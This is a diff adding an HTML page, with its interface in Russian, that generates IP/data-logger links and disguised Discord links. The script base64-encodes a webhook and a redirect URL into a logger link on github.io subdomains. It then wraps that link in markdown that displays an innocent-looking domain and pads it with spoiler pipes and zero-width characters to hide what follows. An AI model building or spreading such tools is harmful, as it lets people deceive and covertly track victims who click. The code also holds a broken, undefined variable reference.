@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Data Logger</title>
+  <style>
+    body {
+      background-color: black;
+      color: white;
+      text-align: center;
+      font-family: 'Courier New', Courier, monospace;
+    }
+    .container {
+      margin-top: 5%;
+      padding: 20px;
+      border: 5px solid red;
+      border-radius: 15px;
+      background-color: rgba(0, 0, 0, 0.8);
+    }
+    h1 {
+      font-size: 50px;
+      text-shadow: 3px 3px 7px black;
+      animation: rainbow 5s infinite;
+    }
+    p, input, button, textarea {
+      font-size: 20px;
+      text-shadow: 2px 2px 5px black;
+    }
+    button {
+      margin: 10px;
+      padding: 10px;
+      font-size: 16px;
+      background-color: red;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: darkred;
+    }
+    textarea {
+      width: 80%;
+      height: 200px;
+      margin-top: 20px;
+      font-size: 16px;
+    }
+    @keyframes rainbow {
+      0% { color: red; }
+      14% { color: orange; }
+      28% { color: yellow; }
+      42% { color: green; }
+      57% { color: blue; }
+      71% { color: indigo; }
+      85% { color: violet; }
+      100% { color: red; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <h1>Data Logger</h1>
+    <p>Заполните форму ниже, чтобы создать кастомную ссылку для IP Логгера.</p>
+
+    <form id="generatorForm">
+      <label for="webhook">URL вебхука:</label><br>
+      <input type="text" id="webhook" name="webhook" required><br><br>
+
+      <label for="redirect">URL для перенаправления (после сбора данных):</label><br>
+      <input type="text" id="redirect" name="redirect" required><br><br>
+
+      <label for="domain">Выберите поддомен:</label><br>
+      <select id="domain" name="domain" required>
+        <option value="">--Выберите поддомен--</option>
+        <option value="IpLogger.github.io">IpLogger.github.io</option>
+        <option value="Megalog.github.io">Megalog.github.io</option>
+      </select><br><br>
+
+      <label for="subdirectory">Выберите путь (подраздел):</label><br>
+      <select id="subdirectory" name="subdirectory" required>
+        <option value="">--Выберите путь--</option>
+        <option value="IpLogger">IpLogger</option>
+        <option value="MegaLogger">MegaLogger</option>
+        <option value="TheLogger">TheLogger</option>
+      </select><br><br>
+
+      <button type="submit">Сгенерировать ссылку</button>
+    </form>
+
+    <h3>Сгенерированная ссылка:</h3>
+    <p id="generatedLink"></p>
+
+    <h3>Сгенерированная фейковая ссылка для Discord:</h3>
+    <p id="discordFakeLink"></p>
+  </div>
+
+  <script>
+    document.getElementById("generatorForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const webhookUrl = document.getElementById("webhook").value;
+      const redirectUrl = document.getElementById("redirect").value;
+      const selectedDomain = document.getElementById("domain").value;
+      const selectedSubdirectory = document.getElementById("subdirectory").value;
+
+      // Проверка на выбор всех полей
+      if (!selectedDomain || !selectedSubdirectory) {
+        alert('Пожалуйста, выберите поддомен и путь!');
+        return;
+      }
+
+      const encodedWebhook = btoa(webhookUrl); 
+      const encodedRedirect = btoa(redirectUrl);
+
+      // Генерируем финальную ссылку
+      const generatedLink = `https://${selectedDomain}/${selectedSubdirectory}?id=${encodedWebhook}&verificator=${encodedRedirect}`;
+
+      // Меняем https на htpss в URL перенаправления
+      const modifiedRedirect = redirectUrl.replace('https://', '');
+
+      // Генерация фейковой ссылки для Discord
+      const fakeDiscordLink = `[${modifiedRedirect}](<${generatedLink}>) ||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| ${RedirectUrl}`;
+
+      // Отображаем сгенерированную ссылку и фейковую ссылку
+      document.getElementById("generatedLink").innerText = generatedLink;
+      document.getElementById("discordFakeLink").innerText = fakeDiscordLink;
+    });
+  </script>
+
+</body>
+</html>
